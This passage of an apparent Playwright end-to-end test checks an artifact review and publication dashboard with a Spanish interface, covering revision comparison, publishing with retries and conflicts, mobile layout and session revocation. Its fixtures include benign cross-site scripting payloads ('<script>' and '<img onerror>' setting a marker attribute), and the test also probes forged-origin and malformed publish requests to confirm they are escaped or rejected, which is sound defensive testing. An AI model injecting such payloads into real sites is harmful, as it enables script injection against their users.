  await panel.goto(`${reviewUrl}?revisionId=${reviewOne.revision.id}&compareTo=${reviewOne.revision.id}&tab=compare`);
  assert.equal(await panel.locator('.compare-form, .content-comparison').count(), 0);
  assert.equal(await panel.getByText('No hay otra revisión disponible para comparar.', { exact: true }).count(), 1);
  const firstPanelCommand = await panel.locator('.publish-form input').evaluateAll((inputs) => Object.fromEntries(inputs.map((input) => [(input as HTMLInputElement).name, (input as HTMLInputElement).value]))) as Record<string, string>;
  assert.equal(firstPanelCommand.revisionId, reviewOne.revision.id);
  assert.equal(firstPanelCommand.expectedPublicationVersion, '0');
  const nativeFirstPost = panel.waitForResponse((response) => response.url() === publishUrl && response.request().method() === 'POST');
  await panel.getByRole('button', { name: 'Publicar revisión 1', exact: true }).click();
  assert.equal((await nativeFirstPost).status(), 200);
  assert.equal(await panel.locator('[data-publication-result]').getAttribute('data-publication-result'), 'published');
  assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.revisionId, reviewOne.revision.id);
  const reviewTwo = await store.update(actor, {
    requestId: randomBytes(16).toString('hex'), artifactId: reviewOne.artifactId, expectedRevisionId: reviewOne.revision.id,
    snapshot: {
      metadata: { title: 'Browser workflow review', description: 'Changed <script>document.body.dataset.reviewEscaped=1</script>', custom: { unsafe: '<img src=x onerror="document.body.dataset.reviewEscaped=1">', retained: false } },
      content: { kind: 'text', text: '<script>document.body.dataset.reviewEscaped=1</script>\n' + 'content'.repeat(180) },
      files: [
        { path: 'added.md', mediaType: 'text/markdown', encoding: 'utf8', data: '# Added' },
        { path: 'changed.bin', mediaType: 'application/octet-stream', encoding: 'base64', data: 'AQID' },
        { path: 'encoding.txt', mediaType: 'text/plain', encoding: 'base64', data: Buffer.from('same bytes').toString('base64') },
        { path: 'unsafe"&<img>.txt', mediaType: 'text/plain', encoding: 'utf8', data: 'escaped path' },
      ],
    },
  });
  let reviewHead = reviewTwo;
  for (let sequence = 3; sequence <= 7; sequence++) reviewHead = await store.update(actor, { requestId: randomBytes(16).toString('hex'), artifactId: reviewOne.artifactId, expectedRevisionId: reviewHead.revision.id, snapshot: reviewTwo.revision.snapshot });
  await panel.goto(dashboard);
  const reviewCard = panel.locator('.artifact-card').filter({ has: panel.getByRole('link', { name: 'Browser workflow review', exact: true }) });
  assert.equal(await reviewCard.locator('.artifact-status').innerText(), 'Cambios pendientes');
  await panel.goto(`${reviewUrl}?revisionId=${reviewTwo.revision.id}&compareTo=${reviewOne.revision.id}`);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-artifact-id'), reviewOne.artifactId);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-id'), reviewTwo.revision.id);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-sha256'), reviewTwo.revision.sha256);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-publication-version'), '1');
  assert.equal(await panel.getByLabel('Revisión seleccionada', { exact: true }).inputValue(), reviewTwo.revision.id);
  assert.equal(await panel.locator('#revisionId option').first().getAttribute('value'), reviewHead.revision.id);
  assert.equal(await panel.locator('.selected-publication').innerText(), 'Publicada: revisión 1');
  assert.equal(new URL((await panel.locator('.published-revision a').getAttribute('href'))!, dashboard).searchParams.get('revisionId'), reviewOne.revision.id);
  await assertPreviewInViewport(panel);
  await panel.screenshot({ path: '.test-artifacts/artifact-review-desktop.png' });
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Información', exact: true }).press('Enter');
  await panel.locator('#information').waitFor();
  assert.equal(await panel.locator('#information dt').filter({ hasText: /^Revisión$/ }).locator('xpath=following-sibling::dd[1]').innerText(), reviewTwo.revision.id);
  assert.equal(await panel.locator('#information dt').filter({ hasText: /^SHA-256$/ }).locator('xpath=following-sibling::dd[1]').innerText(), reviewTwo.revision.sha256);
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Archivos', exact: false }).press('Enter');
  await panel.locator('#files').waitFor();
  assert.equal(await panel.locator('.inventory tbody tr').count(), 4);
  assert.equal(await panel.locator('.inventory tbody tr').filter({ hasText: 'changed.bin' }).locator('td').nth(1).innerText(), '3');
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Comparar', exact: true }).press('Enter');
  await panel.locator('#comparison').waitFor();
  assert.equal(await panel.locator('.comparison tbody tr').count(), 3);
  assert.equal(await panel.locator('.content-comparison pre').nth(0).innerText(), reviewOne.revision.snapshot.content.text);
  assert.equal(await panel.locator('.content-comparison pre').nth(1).innerText(), reviewTwo.revision.snapshot.content.text);
  assert.deepEqual(await panel.locator('.file-changes h4').allTextContents(), ['added.md Agregado', 'changed.bin Modificado', 'encoding.txt Modificado', 'removed.txt Eliminado']);
  assert.equal(await panel.locator('.comparison tbody tr').filter({ hasText: 'Metadatos personalizados' }).locator('td').nth(1).innerText(), JSON.stringify(reviewTwo.revision.snapshot.metadata.custom, null, 2));
  assert.equal(await panel.locator('.detail-body script, .artifact-detail img').count(), 0);
  assert.equal(await panel.locator('body').getAttribute('data-review-escaped'), null);
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Vista previa', exact: true }).press('Enter');
  await panel.locator('.preview').waitFor();
  assert.equal(await panel.locator('.revision-list li').count(), 5);
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('before') === '3'), panel.getByRole('link', { name: 'Ver revisiones anteriores', exact: true }).press('Enter')]);
  assert.equal(new URL(panel.url()).searchParams.get('revisionId'), reviewTwo.revision.id);
  assert.equal(new URL(panel.url()).searchParams.get('compareTo'), reviewOne.revision.id);
  assert.equal(new URL(panel.url()).searchParams.get('before'), '3');
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-id'), reviewTwo.revision.id);
  assert.equal(await panel.locator('.revision-list li').count(), 2);
  await panel.getByLabel('Revisión seleccionada', { exact: true }).selectOption(reviewOne.revision.id);
  const selectorGet = panel.waitForRequest((request) => new URL(request.url()).pathname === new URL(reviewUrl).pathname && request.isNavigationRequest());
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('revisionId') === reviewOne.revision.id), panel.getByRole('button', { name: 'Ver revisión', exact: true }).press('Enter')]);
  assert.equal((await selectorGet).method(), 'GET');
  assert.equal(new URL(panel.url()).searchParams.get('revisionId'), reviewOne.revision.id);
  assert.equal(new URL(panel.url()).searchParams.get('compareTo'), reviewOne.revision.id);
  assert.equal(new URL(panel.url()).searchParams.get('before'), '3');
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-id'), reviewOne.revision.id);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-sha256'), reviewOne.revision.sha256);
  assert.equal(await panel.locator('.publish-form').count(), 0);
  assert.equal(await panel.locator('.detail-header').locator('[data-variant=primary]').innerText(), 'Abrir publicación');
  assert.equal(await panel.locator('.detail-header').getByRole('link', { name: 'Abrir publicación', exact: true }).getAttribute('href'), `${publish}/a/${reviewOne.artifactId}`);
  await panel.frameLocator('.preview').getByRole('heading', { name: 'Saved review one', exact: true }).waitFor();
  assert.equal(new URL((await panel.locator('.preview').getAttribute('src'))!, dashboard).searchParams.get('revisionId'), reviewOne.revision.id);
  await panel.getByRole('button', { name: `Menú de ${reviewOne.revision.snapshot.metadata.title}`, exact: true }).click();
  assert.equal(new URL((await panel.getByRole('menuitem', { name: 'Descargar revisión 1', exact: true }).getAttribute('href'))!, dashboard).searchParams.get('revisionId'), reviewOne.revision.id);
  await panel.keyboard.press('Escape');
  await panel.getByRole('menu').waitFor({ state: 'hidden' });
  await panel.getByLabel('Revisión seleccionada', { exact: true }).selectOption(reviewTwo.revision.id);
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('revisionId') === reviewTwo.revision.id), panel.getByRole('button', { name: 'Ver revisión', exact: true }).press('Enter')]);
  assert.equal(new URL(panel.url()).searchParams.get('before'), '3');
  assert.equal(new URL(panel.url()).searchParams.get('compareTo'), reviewOne.revision.id);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-id'), reviewTwo.revision.id);
  assert.equal(await panel.locator('.artifact-detail').getAttribute('data-revision-sha256'), reviewTwo.revision.sha256);
  assert.equal(await panel.locator('.publish-form input[name="revisionId"]').inputValue(), reviewTwo.revision.id);
  assert.equal(await panel.locator('.publish-form input[name="expectedPublicationVersion"]').inputValue(), '1');
  assert.equal(await panel.frameLocator('.preview').locator('pre').innerText(), reviewTwo.revision.snapshot.content.text);
  assert.equal(new URL((await panel.locator('.preview').getAttribute('src'))!, dashboard).searchParams.get('revisionId'), reviewTwo.revision.id);
  await panel.getByRole('button', { name: 'Menú de Browser workflow review', exact: true }).click();
  assert.equal(new URL((await panel.getByRole('menuitem', { name: 'Descargar revisión 2', exact: true }).getAttribute('href'))!, dashboard).searchParams.get('revisionId'), reviewTwo.revision.id);
  await panel.keyboard.press('Escape');
  await panel.getByRole('menu').waitFor({ state: 'hidden' });
  assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.version, 1);
  await Promise.all([panel.waitForURL((url) => url.searchParams.get('revisionId') === reviewOne.revision.id), panel.getByRole('link', { name: 'Ver revisión 1', exact: true }).press('Enter')]);
  assert.equal(new URL(panel.url()).searchParams.get('compareTo'), null);
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Comparar', exact: true }).press('Enter');
  await panel.locator('#comparison').waitFor();
  assert.equal(await panel.getByLabel('Comparar la seleccionada con', { exact: true }).inputValue(), reviewHead.revision.id);
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Vista previa', exact: true }).press('Enter');
  await panel.frameLocator('.preview').getByRole('heading', { name: 'Saved review one', exact: true }).waitFor();
  await panel.goto(`${reviewUrl}?revisionId=${reviewTwo.revision.id}&compareTo=${reviewOne.revision.id}`);
  await panel.setViewportSize({ width: 390, height: 844 });
  await panel.evaluate(async () => {
    await document.fonts.ready;
    await new Promise<void>((resolve) => requestAnimationFrame(() => requestAnimationFrame(() => resolve())));
  });
  await assertDetailHeaders(panel);
  assert.equal(await panel.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
  assert.equal(await panel.frameLocator('.preview').locator('pre').innerText(), reviewTwo.revision.snapshot.content.text);
  assert.equal(await panel.locator('.preview').getAttribute('sandbox'), 'allow-scripts');
  await assertPreviewInViewport(panel);
  await panel.screenshot({ path: '.test-artifacts/artifact-review-mobile.png' });
  await panel.locator('.detail-tabs').getByRole('link', { name: 'Comparar', exact: true }).press('Enter');
  await panel.locator('.comparison').waitFor();
  assert.equal(await panel.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
  await panel.locator('.comparison').scrollIntoViewIfNeeded();
  await panel.screenshot({ path: '.test-artifacts/artifact-comparison-mobile.png' });
  const commandFields = await panel.locator('.publish-form input').evaluateAll((inputs) => Object.fromEntries(inputs.map((input) => [(input as HTMLInputElement).name, (input as HTMLInputElement).value]))) as Record<string, string>;
  const panelCookieHeader = (await context.cookies(dashboard)).map((cookie) => `${cookie.name}=${cookie.value}`).join('; ');
  const nativePost = (fields: Record<string, string>, headers: Record<string, string> = { origin: dashboard }) => fetch(publishUrl, { method: 'POST', headers: { cookie: panelCookieHeader, 'content-type': 'application/x-www-form-urlencoded', ...headers }, body: new URLSearchParams(fields), redirect: 'manual' });
  assert.equal((await nativePost(commandFields, {})).status, 403);
  assert.equal((await nativePost(commandFields, { origin: collectorOrigin })).status, 403);
  assert.equal((await fetch(publishUrl, { method: 'POST', headers: { origin: dashboard, 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams(commandFields) })).status, 401);
  assert.equal((await context.request.get(publishUrl)).status(), 405);
  assert.equal((await nativePost({ ...commandFields, artifactId: created.artifactId })).status, 400);
  assert.equal((await nativePost({ ...commandFields, revisionId: created.revision.id })).status, 404);
  assert.equal((await nativePost({ ...commandFields, extra: 'unexpected' })).status, 400);
  assert.equal((await nativePost({ ...commandFields, requestId: 'short' })).status, 400);
  for (const version of ['', '-1', '1.1', '1e0', '01', '9007199254740992']) assert.equal((await nativePost({ ...commandFields, expectedPublicationVersion: version })).status, 400);
  for (const extra of `&revisionId=${reviewTwo.revision.id} &requestId=%ZZ &requestId=%ED%A0%80`.split(' ')) {
    const malformed = await fetch(publishUrl, { method: 'POST', headers: { cookie: panelCookieHeader, origin: dashboard, 'content-type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams(commandFields).toString() + extra });
    assert.equal(malformed.status, 400);
  }
  assert.equal((await fetch(publishUrl, { method: 'POST', headers: { cookie: panelCookieHeader, origin: dashboard, 'content-type': 'application/json' }, body: JSON.stringify(commandFields) })).status, 400);
  const outsider = await app.auth.api.signUpEmail({ body: { name: 'Other review owner', email: 'review-other@example.test', password: app.password } });
  await store.share(actor, { requestId: randomBytes(16).toString('hex'), artifactId: created.artifactId, email: outsider.user.email });
  await app.auth.api.signInEmail({ body: { email: 'review-other@example.test', password: app.password } });
  const outsiderSession = await app.db.select().from(session).where(eq(session.userId, outsider.user.id)).get();
  assert(outsiderSession);
  const outsiderArtifact = await store.create({ ...actor, userId: outsider.user.id, sessionId: outsiderSession.id }, { requestId: randomBytes(16).toString('hex'), snapshot: reviewOne.revision.snapshot });
  assert.equal((await context.request.post(`${dashboard}/artifacts/${outsiderArtifact.artifactId}/publish`, { headers: { origin: dashboard }, form: { ...commandFields, artifactId: outsiderArtifact.artifactId, revisionId: outsiderArtifact.revision.id, expectedPublicationVersion: '0' } })).status(), 404);
  assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.version, 1);
  const retryRequestId = commandFields.requestId!;
  await app.client.execute(`CREATE TRIGGER review_publish_outage BEFORE INSERT ON artifact_command WHEN NEW.request_id = '${retryRequestId}' BEGIN SELECT RAISE(FAIL, 'Controlled publication outage'); END`);
  try {
    const failedPost = panel.waitForResponse((response) => response.url() === publishUrl && response.request().method() === 'POST');
    await panel.getByRole('button', { name: 'Publicar revisión 2', exact: true }).click();
    assert.equal((await failedPost).status(), 503);
    assert.equal(await panel.locator('[data-publication-result]').getAttribute('data-publication-result'), 'uncertain');
    const retryFields = await panel.locator('.publish-form input').evaluateAll((inputs) => Object.fromEntries(inputs.map((input) => [(input as HTMLInputElement).name, (input as HTMLInputElement).value])));
    assert.deepEqual(retryFields, commandFields);
    assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.version, 1);
  } finally { await app.client.execute('DROP TRIGGER review_publish_outage'); }
  const retryPost = panel.waitForResponse((response) => response.url() === publishUrl && response.request().method() === 'POST');
  await panel.getByRole('button', { name: 'Reintentar publicación', exact: true }).click();
  assert.equal((await retryPost).status(), 200);
  assert.equal(await panel.locator('[data-publication-result]').getAttribute('data-publication-result'), 'published');
  const savedReview = await store.read(actor, { artifactId: reviewOne.artifactId });
  assert.equal(savedReview.publication?.version, 2);
  assert.equal(savedReview.publication?.revisionId, reviewTwo.revision.id);
  assert.equal(savedReview.headRevisionId, reviewHead.revision.id);
  const exactReplay = await nativePost(commandFields);
  assert.equal(exactReplay.status, 200);
  assert.match(await exactReplay.text(), /data-publication-result="published"/);
  assert.equal((await app.db.select().from(artifactCommand).where(eq(artifactCommand.requestId, retryRequestId))).length, 1);
  const requestConflict = await nativePost({ ...commandFields, revisionId: reviewOne.revision.id });
  assert.equal(requestConflict.status, 409);
  assert.match(await requestConflict.text(), /data-publication-result="conflict"/);
  assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.version, 2);
  const stalePost = await nativePost({ ...commandFields, requestId: randomBytes(16).toString('hex') });
  assert.equal(stalePost.status, 409);
  const staleHtml = await stalePost.text();
  assert.match(staleHtml, /Esta es la publicación actual del artefacto/);
  assert(staleHtml.includes(`revisionId=${reviewTwo.revision.id}`));
  assert.doesNotMatch(staleHtml, /versión/i);
  assert(!staleHtml.includes('class="publish-form"'));
  await store.publish(actor, { requestId: randomBytes(16).toString('hex'), artifactId: reviewOne.artifactId, revisionId: reviewHead.revision.id, expectedPublicationVersion: 2 });
  const superseded = await nativePost(commandFields);
  assert.equal(superseded.status, 200);
  const supersededHtml = await superseded.text();
  assert.match(supersededHtml, /data-publication-result="superseded"/);
  assert.match(supersededHtml, /otra revisión publicada/);
  assert.doesNotMatch(supersededHtml, /versión/i);
  assert(supersededHtml.includes(`revisionId=${reviewHead.revision.id}`));
  const readbackCommand = { artifactId: reviewOne.artifactId, revisionId: reviewOne.revision.id, expectedPublicationVersion: 3, requestId: randomBytes(16).toString('hex') };
  const uncertainReadback = await publishSelectedRevision({ publish: store.publish, read: async () => { throw new Error('Independent read unavailable after commit'); } }, actor, readbackCommand);
  assert.deepEqual(uncertainReadback, { kind: 'uncertain' });
  assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.version, 4);
  const confirmedReadback = await publishSelectedRevision(store, actor, readbackCommand);
  assert.equal(confirmedReadback.kind, 'published');
  assert.equal((await store.read(actor, { artifactId: reviewOne.artifactId })).publication?.version, 4);
  assert.equal((await app.db.select().from(artifactCommand).where(eq(artifactCommand.requestId, readbackCommand.requestId))).length, 1);
  const readable = await store.create(actor, { requestId: randomBytes(16).toString('hex'), project: 'Entregas', snapshot: { metadata: { title: 'Guía de revisión de entregas', description: 'Un documento retenido con sus notas de revisión.' }, content: { kind: 'html', text: '<main style="max-width:720px;margin:40px auto;padding:0 24px;font:18px/1.6 system-ui;color:#132943"><h1>Revisar una entrega</h1><p>Comprueba el contenido guardado y descarga las notas antes de publicar una revisión.</p><h2>Contenido de la entrega</h2><ul><li>Documento completo de la revisión.</li><li>Notas originales como archivo adjunto.</li></ul></main>' }, files: [{ path: 'notas.txt', mediaType: 'text/plain', encoding: 'utf8', data: 'Notas originales de la entrega.\n' }] } });
  const readablePublication = await store.publish(actor, { requestId: randomBytes(16).toString('hex'), artifactId: readable.artifactId, revisionId: readable.revision.id, expectedPublicationVersion: 0 });
  const longTitle = 'Guía de revisión de entregas con documentación completa y referencias para todos los equipos. '.repeat(3).slice(0, 256);
  const longDescription = 'Esta revisión conserva los criterios de aceptación, las decisiones y los archivos originales de la entrega. '.repeat(24);
  const longProject = 'Documentación y revisión de entregas para todos los equipos y proyectos especiales'.slice(0, 80);
  const long = await store.create(actor, { requestId: randomBytes(16).toString('hex'), project: longProject, snapshot: { ...readable.revision.snapshot, metadata: { title: longTitle, description: longDescription } } });
  const longPublication = await store.publish(actor, { requestId: randomBytes(16).toString('hex'), artifactId: long.artifactId, revisionId: long.revision.id, expectedPublicationVersion: 0 });
  for (const [name, viewport] of [['desktop', { width: 1280, height: 900 }], ['mobile', { width: 390, height: 844 }], ['mobile-small', { width: 320, height: 844 }]] as const) {
    await page.setViewportSize(viewport);
    await page.goto(readablePublication.url);
    await page.frameLocator('main > iframe').getByRole('heading', { name: 'Revisar una entrega', exact: true }).waitFor();
    await assertViewerBounds(page);
    const iframeBounds = await page.locator('main > iframe').boundingBox();
    const headingBounds = await page.frameLocator('main > iframe').getByRole('heading', { name: 'Revisar una entrega', exact: true }).boundingBox();
    const loadedFrame = await (await page.locator('main > iframe').elementHandle())!.contentFrame();
    assert(loadedFrame && iframeBounds && headingBounds);
    const contentViewport = await loadedFrame.evaluate(() => ({ width: innerWidth, height: innerHeight, scrollWidth: document.documentElement.scrollWidth }));
    assert.equal(contentViewport.width, viewport.width, 'The actual publication frame must use the selected viewport width');
    assert(headingBounds.y >= iframeBounds.y && headingBounds.y + headingBounds.height <= viewport.height, 'The actual readable document heading must fit within the visible frame');
    await writeFile(`.test-artifacts/publication-geometry-${name}.json`, `${JSON.stringify({ viewport, iframeBounds, headingBounds, contentViewport }, null, 2)}\n`);
    await page.locator('main > iframe').screenshot({ path: `.test-artifacts/publication-frame-${name}.png` });
    await page.screenshot({ path: `.test-artifacts/publication-${name}.png` });
    await page.goto(longPublication.url);
    await page.frameLocator('main > iframe').getByRole('heading', { name: 'Revisar una entrega', exact: true }).waitFor();
    await assertViewerBounds(page);
    await page.locator('main > iframe').screenshot({ path: `.test-artifacts/publication-long-frame-${name}.png` });
    await page.screenshot({ path: `.test-artifacts/publication-long-${name}.png` });
    const projectLink = page.getByRole('link', { name: `Volver al proyecto ${longProject}`, exact: true });
    const projectBounds = await projectLink.boundingBox();
    assert(projectBounds && projectBounds.height >= 44 && projectBounds.x >= 0 && projectBounds.x + projectBounds.width <= viewport.width, 'The project link must remain a visible 44px target within the viewport');
    assert.equal(await projectLink.locator('span').innerText(), longProject);
    await projectLink.click();
    await page.getByRole('heading', { name: longProject, exact: true }).waitFor();
    assert.equal(new URL(page.url()).searchParams.get('project'), longProject);
    await page.getByRole('link', { name: longTitle.trim(), exact: true }).waitFor();
    await page.goto(longPublication.url);
    await page.frameLocator('main > iframe').getByRole('heading', { name: 'Revisar una entrega', exact: true }).waitFor();
    await page.locator('.title-menu > summary').press('Enter');
    await page.locator('summary').filter({ hasText: /^Información$/ }).press('Enter');
    await page.locator('summary').filter({ hasText: /^Archivos \(/ }).press('Enter');
    assert.equal(await page.locator('.information[open], .files[open]').count(), 2);
    assert.equal(await page.locator('.information dt').filter({ hasText: /^Título$/ }).locator('xpath=following-sibling::dd[1]').innerText(), longTitle.trim());
    assert.equal(await page.locator('.information dt').filter({ hasText: /^Descripción$/ }).locator('xpath=following-sibling::dd[1]').innerText(), longDescription.trim());
    await assertViewerBounds(page);
    await page.screenshot({ path: `.test-artifacts/publication-long-open-${name}.png` });
    await page.getByRole('link', { name: 'notas.txt', exact: true }).focus();
    const attachmentBounds = await page.getByRole('link', { name: 'notas.txt', exact: true }).boundingBox();
    const disclosureBounds = await page.locator('.disclosures').boundingBox();
    assert(attachmentBounds && disclosureBounds && attachmentBounds.y >= disclosureBounds.y && attachmentBounds.y + attachmentBounds.height <= disclosureBounds.y + disclosureBounds.height, 'An attachment must remain focusable within the scrolling title menu overlay');
    if (name === 'mobile-small') continue;
    await panel.setViewportSize(viewport);
    await panel.goto(`${dashboard}/artifacts/${long.artifactId}?revisionId=${long.revision.id}`);
    await panel.frameLocator('.preview').getByRole('heading', { name: 'Revisar una entrega', exact: true }).waitFor();
    await panel.screenshot({ path: `.test-artifacts/artifact-long-${name}.png` });
    await assertPreviewInViewport(panel);
    await panel.locator('.detail-tabs').getByRole('link', { name: 'Información', exact: true }).press('Enter');
    await panel.locator('#information').waitFor();
    assert.equal(await panel.locator('#information dt').filter({ hasText: /^Título$/ }).locator('xpath=following-sibling::dd[1]').innerText(), longTitle.trim());
    assert.equal(await panel.locator('#information dt').filter({ hasText: /^Descripción$/ }).locator('xpath=following-sibling::dd[1]').innerText(), longDescription.trim());
  }
  const anonymous = await browser.newContext();
  const anonymousPage = await anonymous.newPage();
  await anonymousPage.goto(secondPublication.url);
  await anonymousPage.getByLabel('Correo electrónico').waitFor();
  assert.equal(await anonymousPage.locator('iframe').count(), 0);
  assert.equal((await anonymous.request.get(attachment, { maxRedirects: 0 })).status(), 401);
  assert.equal((await anonymous.request.get(`${dashboard}/artifacts/${created.artifactId}/export?revisionId=${created.revision.id}`)).status(), 401);
  await anonymous.close();
  await panel.goto(dashboard);
  await panel.getByRole('heading', { name: 'Biblioteca', exact: true }).waitFor();
  await panel.locator('.library-navigation > summary').click();
  await panel.locator('summary[aria-label="Mi cuenta"]').click();
  await panel.getByRole('link', { name: 'Cerrar todas las sesiones', exact: true }).click();
  await panel.getByRole('button', { name: 'Cerrar todas las sesiones', exact: true }).click();
  await panel.getByRole('link', { name: 'Iniciar sesión', exact: true }).waitFor();
  const revokedDocument = await fetch(secondPublication.url, { headers: { cookie: viewerHeader }, redirect: 'manual' });
  const revokedAttachment = await fetch(attachment, { headers: { cookie: viewerHeader }, redirect: 'manual' });
  assert.equal(revokedDocument.status, 403);
  assert.equal(revokedAttachment.status, 403);
  assert(!(await revokedDocument.text()).includes('Updated document'));
  assert(!(await revokedAttachment.text()).includes('Second attachment'));
  const beforeOutage = publicationHandler;
  publicationHandler = createPublicationApp({ DASHBOARD_URL: dashboard, PUBLISH_URL: publish, PUBLICATION_SERVICE_SECRET: serviceSecret, PUBLICATION_COOKIE_SECRET: cookieSecret }, async () => { throw new Error('Backend disconnected'); });
  assert.equal((await fetch(secondPublication.url, { headers: { cookie: viewerHeader }, redirect: 'manual' })).status, 503);
  publicationHandler = beforeOutage;
  console.log('Artifact browser proof passed. Owner and invited-reader publication wording, single-revision comparison empty state, distinct unpublished comparison defaults and cleared self-comparisons, exact markers, bounded retained history, escaped revision comparisons and inventory, native pinned publication, unchanged retries, conflicts and independent read-back, stable publication, clean one-use handoff, sandbox isolation, exact historical export, revision-bound attachments, mobile layout, anonymous denial, central revocation and backend outage.');
} catch (error) {
  await mkdir('.test-artifacts/artifact-browser-failure', { recursive: true });
  for (const [index, page] of (browser?.contexts().flatMap((context) => context.pages()) ?? []).entries()) {
    await page.screenshot({ path: `.test-artifacts/artifact-browser-failure/page-${index}.png`, fullPage: true }).catch(() => undefined);
    await writeFile(`.test-artifacts/artifact-browser-failure/page-${index}.aria.yml`, await page.locator('body').ariaSnapshot()).catch(() => undefined);
  }
  throw error;
} finally {
  await browser?.close();
  child.kill('SIGTERM');
  if (child.exitCode === null) await once(child, 'exit');
  if ('closeAllConnections' in publicationServer) publicationServer.closeAllConnections();
  await new Promise<void>((resolve) => publicationServer.close(() => resolve()));
  collector.closeAllConnections();
  await new Promise<void>((resolve) => collector.close(() => resolve()));
  await app.close();
}
